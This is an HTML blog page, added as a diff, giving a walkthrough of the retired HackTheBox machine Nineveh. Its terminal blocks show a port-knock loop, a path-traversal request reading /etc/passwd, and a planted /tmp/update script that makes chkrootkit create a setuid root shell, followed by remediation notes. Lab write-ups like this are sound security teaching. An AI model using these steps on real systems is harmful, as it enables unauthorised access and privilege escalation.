@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Nineveh: port knocking, notes LFI, and chkrootkit to root — Lucky Thandel</title>
+<meta name="description" content="Filtered SSH opens to a knock sequence, secure_notes leaks via LFI, and chkrootkit 0.49 runs attacker-controlled /tmp/update as root. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-25 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Nineveh: port knocking, notes LFI, and chkrootkit to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Nineveh is a retired HackTheBox easy Linux machine famous for one mechanic: port knocking. Synopsis: a filtered SSH port opens to a knock sequence, a notes-app LFI discloses credentials, and chkrootkit 0.49 runs attacker-controlled /tmp/update as root.</p>
+<h2><span class="amber">$</span> Enumeration — filtered is not closed</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: full sweep plus knock</span>
+nmap -sC -sV -p- -oN nineveh.nmap 10.10.10.43   # SSH shows filtered
+# knock sequence from the box hints (ports 7000,8000,9000 family):
+for p in 7000 8000 9000; do nmap -Pn --host-timeout 3 --max-retries 0 -p $p 10.10.10.43; done
+ssh amrois@10.10.10.43   # port now open</pre>
+<p>Filtered differs from closed — knock first. The web app (secure_notes) plus on-box hints reveal the sequence; after knocking, SSH swings open.</p>
+<h2><span class="amber">$</span> Foothold pieces — LFI to creds</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: notes LFI to login</span>
+# secure_notes local file inclusion discloses local files incl. key material:
+curl &quot;http://10.10.10.43/secure_notes/notes.php?note=../../../../etc/passwd&quot;
+# -&gt; amrois credential material; SSH in normally</pre>
+<p>Use LFI for credential disclosure, then log in like a gentleman. Two small findings compose into one foothold — easy boxes love composition.</p>
+<h2><span class="amber">$</span> Privilege escalation — chkrootkit 0.49</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: plant /tmp/update, wait</span>
+chkrootkit -V   # 0.49, runs /tmp/update as root on schedule
+echo -e '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; /tmp/update
+chmod +x /tmp/update
+# wait for the scheduled run, then:
+/tmp/rootbash -p
+id   # uid=0(root)</pre>
+<p>Ancient chkrootkit executes /tmp/update as root. Drop a malicious script, wait for the scheduled run, catch root. The scanner becomes the vulnerability. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Declaring SSH unreachable (knock first) and exploiting LFI for RCE directly (disclose creds, then log in).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Retire port-knocking-as-security, patch or remove chkrootkit-era tooling, and never execute world-writable files as root. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
